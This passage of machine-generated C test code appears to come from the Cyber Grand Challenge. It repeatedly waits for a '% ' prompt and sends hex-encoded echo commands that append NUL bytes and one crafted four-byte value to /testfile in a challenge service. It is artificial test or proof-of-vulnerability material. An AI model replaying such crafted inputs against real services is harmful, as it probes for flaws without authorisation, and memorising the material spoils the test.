         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x22\x20"
         "\x3e\x3e\x20\x2f\x74\x65\x73\x74\x66\x69\x6c\x65\x0a";
      static unsigned int write_00134_00000_len = 141;
      unsigned char *write_00134 = NULL;
      unsigned int write_00134_len = 0;
      write_00134 = cgc_append_buf(write_00134, &write_00134_len, write_00134_00000, write_00134_00000_len);
      if (write_00134_len > 0) {
         cgc_transmit_all(1, write_00134, write_00134_len);
      }
      cgc_free(write_00134);
   } while (0);
   do {
      unsigned char *read_00136;
      unsigned int read_00136_len;
      unsigned int read_00136_ptr = 0;
      //**** delimited read
      static unsigned char read_00136_delim[] = 
         "\x25\x20";
      read_00136 = NULL;
      read_00136_len = 0;
      int read_00136_res = cgc_delimited_read(0, &read_00136, &read_00136_len, read_00136_delim, 2);
      if (read_00136_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00136_00000[] = 
         "\x25\x20";
      read_00136_ptr += cgc_data_match(read_00136 + read_00136_ptr, read_00136_len - read_00136_ptr, match_00136_00000, 2);
      cgc_free(read_00136);
      if (read_00136_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00135_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x22\x20"
         "\x3e\x3e\x20\x2f\x74\x65\x73\x74\x66\x69\x6c\x65\x0a";
      static unsigned int write_00135_00000_len = 141;
      unsigned char *write_00135 = NULL;
      unsigned int write_00135_len = 0;
      write_00135 = cgc_append_buf(write_00135, &write_00135_len, write_00135_00000, write_00135_00000_len);
      if (write_00135_len > 0) {
         cgc_transmit_all(1, write_00135, write_00135_len);
      }
      cgc_free(write_00135);
   } while (0);
   do {
      unsigned char *read_00137;
      unsigned int read_00137_len;
      unsigned int read_00137_ptr = 0;
      //**** delimited read
      static unsigned char read_00137_delim[] = 
         "\x25\x20";
      read_00137 = NULL;
      read_00137_len = 0;
      int read_00137_res = cgc_delimited_read(0, &read_00137, &read_00137_len, read_00137_delim, 2);
      if (read_00137_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00137_00000[] = 
         "\x25\x20";
      read_00137_ptr += cgc_data_match(read_00137 + read_00137_ptr, read_00137_len - read_00137_ptr, match_00137_00000, 2);
      cgc_free(read_00137);
      if (read_00137_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00136_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x22\x20"
         "\x3e\x3e\x20\x2f\x74\x65\x73\x74\x66\x69\x6c\x65\x0a";
      static unsigned int write_00136_00000_len = 141;
      unsigned char *write_00136 = NULL;
      unsigned int write_00136_len = 0;
      write_00136 = cgc_append_buf(write_00136, &write_00136_len, write_00136_00000, write_00136_00000_len);
      if (write_00136_len > 0) {
         cgc_transmit_all(1, write_00136, write_00136_len);
      }
      cgc_free(write_00136);
   } while (0);
   do {
      unsigned char *read_00138;
      unsigned int read_00138_len;
      unsigned int read_00138_ptr = 0;
      //**** delimited read
      static unsigned char read_00138_delim[] = 
         "\x25\x20";
      read_00138 = NULL;
      read_00138_len = 0;
      int read_00138_res = cgc_delimited_read(0, &read_00138, &read_00138_len, read_00138_delim, 2);
      if (read_00138_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00138_00000[] = 
         "\x25\x20";
      read_00138_ptr += cgc_data_match(read_00138 + read_00138_ptr, read_00138_len - read_00138_ptr, match_00138_00000, 2);
      cgc_free(read_00138);
      if (read_00138_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00137_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x22\x20"
         "\x3e\x3e\x20\x2f\x74\x65\x73\x74\x66\x69\x6c\x65\x0a";
      static unsigned int write_00137_00000_len = 141;
      unsigned char *write_00137 = NULL;
      unsigned int write_00137_len = 0;
      write_00137 = cgc_append_buf(write_00137, &write_00137_len, write_00137_00000, write_00137_00000_len);
      if (write_00137_len > 0) {
         cgc_transmit_all(1, write_00137, write_00137_len);
      }
      cgc_free(write_00137);
   } while (0);
   do {
      unsigned char *read_00139;
      unsigned int read_00139_len;
      unsigned int read_00139_ptr = 0;
      //**** delimited read
      static unsigned char read_00139_delim[] = 
         "\x25\x20";
      read_00139 = NULL;
      read_00139_len = 0;
      int read_00139_res = cgc_delimited_read(0, &read_00139, &read_00139_len, read_00139_delim, 2);
      if (read_00139_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00139_00000[] = 
         "\x25\x20";
      read_00139_ptr += cgc_data_match(read_00139 + read_00139_ptr, read_00139_len - read_00139_ptr, match_00139_00000, 2);
      cgc_free(read_00139);
      if (read_00139_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00138_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x22\x20"
         "\x3e\x3e\x20\x2f\x74\x65\x73\x74\x66\x69\x6c\x65\x0a";
      static unsigned int write_00138_00000_len = 141;
      unsigned char *write_00138 = NULL;
      unsigned int write_00138_len = 0;
      write_00138 = cgc_append_buf(write_00138, &write_00138_len, write_00138_00000, write_00138_00000_len);
      if (write_00138_len > 0) {
         cgc_transmit_all(1, write_00138, write_00138_len);
      }
      cgc_free(write_00138);
   } while (0);
   do {
      unsigned char *read_00140;
      unsigned int read_00140_len;
      unsigned int read_00140_ptr = 0;
      //**** delimited read
      static unsigned char read_00140_delim[] = 
         "\x25\x20";
      read_00140 = NULL;
      read_00140_len = 0;
      int read_00140_res = cgc_delimited_read(0, &read_00140, &read_00140_len, read_00140_delim, 2);
      if (read_00140_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00140_00000[] = 
         "\x25\x20";
      read_00140_ptr += cgc_data_match(read_00140 + read_00140_ptr, read_00140_len - read_00140_ptr, match_00140_00000, 2);
      cgc_free(read_00140);
      if (read_00140_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00139_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x22\x20\x3e\x3e\x20\x2f\x74\x65\x73\x74"
         "\x66\x69\x6c\x65\x0a";
      static unsigned int write_00139_00000_len = 117;
      unsigned char *write_00139 = NULL;
      unsigned int write_00139_len = 0;
      write_00139 = cgc_append_buf(write_00139, &write_00139_len, write_00139_00000, write_00139_00000_len);
      if (write_00139_len > 0) {
         cgc_transmit_all(1, write_00139, write_00139_len);
      }
      cgc_free(write_00139);
   } while (0);
   do {
      unsigned char *read_00141;
      unsigned int read_00141_len;
      unsigned int read_00141_ptr = 0;
      //**** delimited read
      static unsigned char read_00141_delim[] = 
         "\x25\x20";
      read_00141 = NULL;
      read_00141_len = 0;
      int read_00141_res = cgc_delimited_read(0, &read_00141, &read_00141_len, read_00141_delim, 2);
      if (read_00141_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00141_00000[] = 
         "\x25\x20";
      read_00141_ptr += cgc_data_match(read_00141 + read_00141_ptr, read_00141_len - read_00141_ptr, match_00141_00000, 2);
      cgc_free(read_00141);
      if (read_00141_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00140_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x5c\x78\x30\x31\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x22\x20\x3e\x3e\x20\x2f\x74\x65\x73\x74"
         "\x66\x69\x6c\x65\x0a";
      static unsigned int write_00140_00000_len = 37;
      unsigned char *write_00140 = NULL;
      unsigned int write_00140_len = 0;
      write_00140 = cgc_append_buf(write_00140, &write_00140_len, write_00140_00000, write_00140_00000_len);
      if (write_00140_len > 0) {
         cgc_transmit_all(1, write_00140, write_00140_len);
      }
      cgc_free(write_00140);
   } while (0);
   do {
      unsigned char *read_00142;
      unsigned int read_00142_len;
      unsigned int read_00142_ptr = 0;
      //**** delimited read
      static unsigned char read_00142_delim[] = 
         "\x25\x20";
      read_00142 = NULL;
      read_00142_len = 0;
      int read_00142_res = cgc_delimited_read(0, &read_00142, &read_00142_len, read_00142_delim, 2);
      if (read_00142_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00142_00000[] = 
         "\x25\x20";
      read_00142_ptr += cgc_data_match(read_00142 + read_00142_ptr, read_00142_len - read_00142_ptr, match_00142_00000, 2);
      cgc_free(read_00142);
      if (read_00142_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00141_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x22\x20\x3e\x3e\x20\x2f\x74\x65\x73\x74"
         "\x66\x69\x6c\x65\x0a";
      static unsigned int write_00141_00000_len = 37;
      unsigned char *write_00141 = NULL;
      unsigned int write_00141_len = 0;
      write_00141 = cgc_append_buf(write_00141, &write_00141_len, write_00141_00000, write_00141_00000_len);
      if (write_00141_len > 0) {
         cgc_transmit_all(1, write_00141, write_00141_len);
      }
      cgc_free(write_00141);
   } while (0);
   do {
      unsigned char *read_00143;
      unsigned int read_00143_len;
      unsigned int read_00143_ptr = 0;
      //**** delimited read
      static unsigned char read_00143_delim[] = 
         "\x25\x20";
      read_00143 = NULL;
      read_00143_len = 0;
      int read_00143_res = cgc_delimited_read(0, &read_00143, &read_00143_len, read_00143_delim, 2);
      if (read_00143_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00143_00000[] = 
         "\x25\x20";
      read_00143_ptr += cgc_data_match(read_00143 + read_00143_ptr, read_00143_len - read_00143_ptr, match_00143_00000, 2);
      cgc_free(read_00143);
      if (read_00143_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00142_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x5c\x78\x30\x31\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x22\x20\x3e\x3e\x20\x2f\x74\x65\x73\x74"
         "\x66\x69\x6c\x65\x0a";
      static unsigned int write_00142_00000_len = 37;
      unsigned char *write_00142 = NULL;
      unsigned int write_00142_len = 0;
      write_00142 = cgc_append_buf(write_00142, &write_00142_len, write_00142_00000, write_00142_00000_len);
      if (write_00142_len > 0) {
         cgc_transmit_all(1, write_00142, write_00142_len);
      }
      cgc_free(write_00142);
   } while (0);
   do {
      unsigned char *read_00144;
      unsigned int read_00144_len;
      unsigned int read_00144_ptr = 0;
      //**** delimited read
      static unsigned char read_00144_delim[] = 
         "\x25\x20";
      read_00144 = NULL;
      read_00144_len = 0;
      int read_00144_res = cgc_delimited_read(0, &read_00144, &read_00144_len, read_00144_delim, 2);
      if (read_00144_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00144_00000[] = 
         "\x25\x20";
      read_00144_ptr += cgc_data_match(read_00144 + read_00144_ptr, read_00144_len - read_00144_ptr, match_00144_00000, 2);
      cgc_free(read_00144);
      if (read_00144_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00143_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x22\x20\x3e\x3e\x20\x2f\x74\x65\x73\x74"
         "\x66\x69\x6c\x65\x0a";
      static unsigned int write_00143_00000_len = 37;
      unsigned char *write_00143 = NULL;
      unsigned int write_00143_len = 0;
      write_00143 = cgc_append_buf(write_00143, &write_00143_len, write_00143_00000, write_00143_00000_len);
      if (write_00143_len > 0) {
         cgc_transmit_all(1, write_00143, write_00143_len);
      }
      cgc_free(write_00143);
   } while (0);
   do {
      unsigned char *read_00145;
      unsigned int read_00145_len;
      unsigned int read_00145_ptr = 0;
      //**** delimited read
      static unsigned char read_00145_delim[] = 
         "\x25\x20";
      read_00145 = NULL;
      read_00145_len = 0;
      int read_00145_res = cgc_delimited_read(0, &read_00145, &read_00145_len, read_00145_delim, 2);
      if (read_00145_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00145_00000[] = 
         "\x25\x20";
      read_00145_ptr += cgc_data_match(read_00145 + read_00145_ptr, read_00145_len - read_00145_ptr, match_00145_00000, 2);
      cgc_free(read_00145);
      if (read_00145_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00144_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x5c\x78\x39\x38\x5c\x78\x61\x65\x5c\x78"
         "\x61\x61\x5c\x78\x62\x61\x22\x20\x3e\x3e\x20\x2f\x74\x65\x73\x74"
         "\x66\x69\x6c\x65\x0a";
      static unsigned int write_00144_00000_len = 37;
      unsigned char *write_00144 = NULL;
      unsigned int write_00144_len = 0;
      write_00144 = cgc_append_buf(write_00144, &write_00144_len, write_00144_00000, write_00144_00000_len);
      if (write_00144_len > 0) {
         cgc_transmit_all(1, write_00144, write_00144_len);
      }
      cgc_free(write_00144);
   } while (0);
   do {
      unsigned char *read_00146;
      unsigned int read_00146_len;
      unsigned int read_00146_ptr = 0;
      //**** delimited read
      static unsigned char read_00146_delim[] = 
         "\x25\x20";
      read_00146 = NULL;
      read_00146_len = 0;
      int read_00146_res = cgc_delimited_read(0, &read_00146, &read_00146_len, read_00146_delim, 2);
      if (read_00146_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00146_00000[] = 
         "\x25\x20";
      read_00146_ptr += cgc_data_match(read_00146 + read_00146_ptr, read_00146_len - read_00146_ptr, match_00146_00000, 2);
      cgc_free(read_00146);
      if (read_00146_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00145_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x22\x20\x3e\x3e\x20\x2f\x74\x65\x73\x74"
         "\x2f\x66\x61\x6b\x65\x0a";
      static unsigned int write_00145_00000_len = 38;
      unsigned char *write_00145 = NULL;
      unsigned int write_00145_len = 0;
      write_00145 = cgc_append_buf(write_00145, &write_00145_len, write_00145_00000, write_00145_00000_len);
      if (write_00145_len > 0) {
         cgc_transmit_all(1, write_00145, write_00145_len);
      }
      cgc_free(write_00145);
   } while (0);
   do {
      unsigned char *read_00147;
      unsigned int read_00147_len;
      unsigned int read_00147_ptr = 0;
      //**** delimited read
      static unsigned char read_00147_delim[] = 
         "\x25\x20";
      read_00147 = NULL;
      read_00147_len = 0;
      int read_00147_res = cgc_delimited_read(0, &read_00147, &read_00147_len, read_00147_delim, 2);
      if (read_00147_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00147_00000[] = 
         "\x25\x20";
      read_00147_ptr += cgc_data_match(read_00147 + read_00147_ptr, read_00147_len - read_00147_ptr, match_00147_00000, 2);
      cgc_free(read_00147);
      if (read_00147_ptr) {}  //silence unused variable warning if any
   } while (0);
}
